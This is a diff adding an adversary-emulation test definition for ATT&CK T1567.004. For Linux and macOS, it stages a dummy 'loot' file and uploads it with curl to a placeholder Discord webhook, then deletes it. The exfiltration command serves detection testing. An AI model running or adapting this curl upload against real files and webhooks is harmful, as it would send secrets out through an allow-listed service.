@@ -1,0 +1,33 @@
+---
+- id: 4ed84855217c70d4976ab502272f18e8
+  name: Exfiltrate staged file to a Discord webhook with curl (bash)
+  description: 'Stages a file containing simulated sensitive data and uploads it as
+    a multipart
+
+    `file` attachment to a Discord incoming webhook using curl. This produces an outbound
+
+    HTTPS POST to a commonly allow-listed SaaS endpoint, mirroring real-world data
+    theft
+
+    that abuses Discord webhooks for exfiltration.
+
+    See https://discord.com/developers/docs/resources/webhook#execute-webhook
+
+    '
+  tactic: exfiltration
+  technique:
+    attack_id: T1567.004
+    name: 'Exfiltration Over Web Service: Exfiltration Over Webhook'
+  platforms:
+    linux:
+      sh:
+        command: echo "secrets, api keys, passwords - T1567.004 atomic test" > "/tmp/T1567.004_loot.txt";
+          curl -s -F "file=@/tmp/T1567.004_loot.txt" "https://discord.com/api/webhooks/000000000000000000/ReplaceWithYourWebhookToken"
+        payloads: []
+        cleanup: rm -f "/tmp/T1567.004_loot.txt"
+    darwin:
+      sh:
+        command: echo "secrets, api keys, passwords - T1567.004 atomic test" > "/tmp/T1567.004_loot.txt";
+          curl -s -F "file=@/tmp/T1567.004_loot.txt" "https://discord.com/api/webhooks/000000000000000000/ReplaceWithYourWebhookToken"
+        payloads: []
+        cleanup: rm -f "/tmp/T1567.004_loot.txt"
